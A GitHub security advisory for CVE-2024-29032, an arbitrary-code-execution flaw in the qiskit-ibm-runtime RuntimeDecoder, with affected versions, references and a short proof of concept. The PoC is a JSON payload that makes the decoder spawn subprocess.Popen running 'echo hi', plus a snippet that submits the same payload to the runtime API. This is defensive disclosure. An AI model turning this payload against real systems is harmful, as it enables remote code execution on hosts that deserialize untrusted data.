# [M] `qiskit_ibm_runtime.RuntimeDecoder` can execute arbitrary code

## Summary
Severity: Medium
Advisory: GHSA-x4x5-jv3x-9c7m
CVE: CVE-2024-29032
CWE: CWE-502
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2024-03-20
Source: https://github.com/advisories/GHSA-x4x5-jv3x-9c7m
Type: github-advisory

## Affected
- PyPI: `qiskit-ibm-runtime` — affected >=0.1.0 <0.21.2

## Details
### Summary

deserializing json data using `qiskit_ibm_runtime.RuntimeDecoder` can be made to execute arbitrary code given a correctly formatted input string

### Details

`RuntimeDecoder` is supposed to be able to deserialize JSON strings containing various special types encoded via `RuntimeEncoder`. However, one can structure a malicious payload to cause the decoder to spawn a subprocess and execute arbitrary code, exploiting this block of code: https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159

### PoC

```python
malicious_data = {
    "__type__": "settings",
    "__module__": "subprocess",
    "__class__": "Popen",
    "__value__": {
        "args": ["echo", "hi"]
    },
}
json_str = json.dumps(malicious_data)

_ = json.loads(json_str, cls=qiskit_ibm_runtime.RuntimeDecoder)  # prints "hi" to the terminal
```
(where obviously "echo hi" can be replaced with something much more malicious)

notably the following also makes it through the runtime API, with `malicious_data` serialized client-side via `RuntimeEncoder` (and therefore presumably deserialized server-side via `RuntimeDecoder`?)
```python
service = qiskit_ibm_runtime(<ibm_cloud_credentials>)
job = service.run("qasm3-runner", malicious_data)
print(job.status())  # prints "JobStatus.QUEUED"
```

### Impact

i don't know if `qiskit_ibm_runtime.RuntimeDecoder` is used server-side so this may or may not be a serious vulnerability on your end (however it's definitely a security hole for anyone using the library to deserialize third-party data)

## References
- https://github.com/Qiskit/qiskit-ibm-runtime/security/advisories/GHSA-x4x5-jv3x-9c7m
- https://nvd.nist.gov/vuln/detail/CVE-2024-29032
- https://github.com/Qiskit/qiskit-ibm-runtime/commit/b78fca114133051805d00043a404b25a33835f4d
- https://github.com/Qiskit/qiskit-ibm-runtime
- https://github.com/Qiskit/qiskit-ibm-runtime/blob/16e90f475e78a9d2ae77daa139ef750cfa84ca82/qiskit_ibm_runtime/utils/json.py#L156-L159
